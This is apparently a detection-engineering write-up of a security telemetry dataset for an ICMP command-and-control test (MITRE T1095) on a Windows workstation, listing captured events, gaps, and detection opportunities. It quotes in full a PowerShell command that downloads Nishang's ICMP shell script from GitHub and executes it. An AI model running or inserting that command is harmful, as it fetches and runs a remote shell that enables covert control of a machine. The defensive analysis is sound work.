# T1095-1: Non-Application Layer Protocol — Non-Application Layer Protocol (ICMP C2) on Windows 11 Enterprise domain workstation

## Technique Context

T1095 (Non-Application Layer Protocol) represents adversary command and control communications that operate below the application layer, typically using protocols like ICMP, UDP, or raw sockets. This technique is particularly concerning because it often bypasses traditional network monitoring that focuses on HTTP/HTTPS traffic. The detection community emphasizes monitoring for unusual ICMP traffic patterns, unexpected raw socket usage, and process behaviors that interact with low-level networking APIs.

ICMP-based C2 channels are especially attractive to attackers because ICMP is rarely filtered or monitored in enterprise environments, despite being a viable tunneling protocol for command execution and data exfiltration. The Nishang framework's Invoke-PowerShellIcmp module, used in this test, creates a PowerShell-based ICMP shell that encodes commands in ICMP packets.

## What This Dataset Contains

This dataset captures a PowerShell-based ICMP C2 attempt using the Nishang framework. The attack chain begins with Security event 4688 showing PowerShell execution with the command line: `"powershell.exe" & {IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress 127.0.0.1}`.

The process creation chain shows multiple PowerShell instances with Sysmon EID 1 capturing `whoami.exe` execution (ProcessId 27748) and a child PowerShell process (ProcessId 28232) that downloads and executes the ICMP shell script. Sysmon EID 10 events show process access patterns typical of PowerShell's process management, with the parent PowerShell accessing both the whoami.exe process and other PowerShell instances with PROCESS_ALL_ACCESS (0x1FFFFF).

The telemetry includes extensive DLL loading patterns in Sysmon EID 7 events, showing .NET runtime components (mscoree.dll, clr.dll, System.Management.Automation.ni.dll) and Windows Defender integration (MpOAV.dll, MpClient.dll) across all PowerShell processes. Sysmon EID 17 captures named pipe creation for PowerShell host communication, and EID 11 shows PowerShell profile file creation.

## What This Dataset Does Not Contain

Crucially, this dataset lacks Sysmon EID 3 (Network Connection) events, which would be the primary evidence of the actual ICMP C2 communication. The metadata indicates that Sysmon network connection logging is enabled, but no network events appear in the data, suggesting the ICMP shell may have failed to establish or Windows Defender blocked the network activity before connections could be made.

The dataset also lacks any DNS query events (Sysmon EID 22) for the GitHub raw content URL, indicating the web request to download the Nishang script may have been blocked or failed. PowerShell script block logging (EID 4104) only captures boilerplate error handling scriptblocks rather than the actual malicious script content, suggesting the download and execution of the Nishang script was prevented.

No process termination events indicate abnormal exit codes, and the presence of Windows Defender DLL loading suggests real-time protection was actively monitoring the PowerShell processes.

## Assessment

This dataset provides excellent evidence of the initial stages of an ICMP C2 attempt but demonstrates how modern endpoint protection can prevent technique completion. The process creation and command line telemetry in Security 4688 events is outstanding for detection purposes, clearly showing the attack vector and malicious URLs. The Sysmon process access events (EID 10) provide valuable behavioral indicators of PowerShell's process interaction patterns.

However, the lack of network telemetry significantly limits this dataset's utility for understanding the actual C2 communication patterns. For building comprehensive T1095 detections, this dataset would be stronger with successful network connections, but it excellently demonstrates the defensive value of endpoint protection and provides clear indicators for preventive detections.

## Detection Opportunities Present in This Data

1. **Command line detection** for PowerShell execution with IEX and DownloadString patterns, specifically targeting the Nishang GitHub repository URLs in Security 4688 events

2. **Process creation anomalies** detecting PowerShell spawning whoami.exe followed by additional PowerShell instances, visible in Sysmon EID 1 process chains

3. **Suspicious process access patterns** where PowerShell processes access other processes with full permissions (0x1FFFFF) as shown in Sysmon EID 10 events

4. **PowerShell module loading** detection for rapid .NET runtime and System.Management.Automation DLL loads in Sysmon EID 7 events within seconds

5. **Named pipe creation monitoring** for PowerShell host communication pipes with random identifiers in Sysmon EID 17

6. **Token privilege escalation** detection based on Security EID 4703 showing extensive privilege enablement for PowerShell processes

7. **File system activity correlation** detecting PowerShell profile file creation concurrent with suspicious network-related PowerShell execution in Sysmon EID 11

8. **Process tree analysis** identifying parent-child relationships between PowerShell instances executing network download commands and system discovery tools
